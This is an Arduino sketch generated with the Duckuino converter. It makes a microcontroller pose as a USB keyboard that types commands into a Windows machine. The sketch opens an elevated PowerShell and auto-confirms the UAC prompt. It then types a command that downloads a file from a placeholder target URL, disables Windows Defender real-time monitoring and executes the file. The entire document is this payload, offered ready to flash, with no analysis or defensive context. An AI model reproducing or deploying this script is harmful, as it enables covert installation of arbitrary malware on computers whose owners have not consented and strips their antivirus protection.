/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("powershell Start-Process powershell -Verb runAs"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("$down = New-Object System.Net.WebClient; $url = 'THE_URL_YOU_WANT_TO_DOWNLOAD_ON_THE_TARGET'; $file = 'FILE_NAME'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; Set-MpPreference -DisableRealtimeMonitoring $true; $exec.shellexecute($file); exit;"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
